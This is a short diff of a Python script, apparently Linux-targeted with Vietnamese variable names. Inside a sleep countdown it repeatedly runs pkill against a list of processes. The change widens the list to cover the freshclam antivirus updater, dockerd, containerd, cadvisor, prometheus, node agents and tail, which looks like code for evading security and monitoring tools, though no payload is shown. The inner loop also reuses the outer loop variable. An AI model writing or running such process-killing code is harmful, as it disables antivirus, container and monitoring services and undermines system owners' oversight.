@@ -217,23 +217,9 @@ if operate_system == 'lin':
         for i in range(0, thoi_gian_nghi, 10):
             time.sleep(10)
             print('Thoi gian con la la ' + str(thoi_gian_nghi - i))
-            try:
-                os.system('pkill containerd')
-            except:
-                pass
-            try:
-                os.system('pkill cadvisor')
-            except:
-                pass
-            try:
-                os.system('pkill prometheus')
-            except:
-                pass
-            try:
-                os.system('pkill node_agent')
-            except:
-                pass
-            try:
-                os.system('pkill tail')
-            except:
-                pass
+            array_kill = ['freshclam', 'dockerd', 'containerd', 'node_controller', 'cadvisor', 'prometheus', 'node_agent', 'tail']
+            for i in array_kill:
+                try:
+                    os.system('pkill ' + i)
+                except:
+                    pass
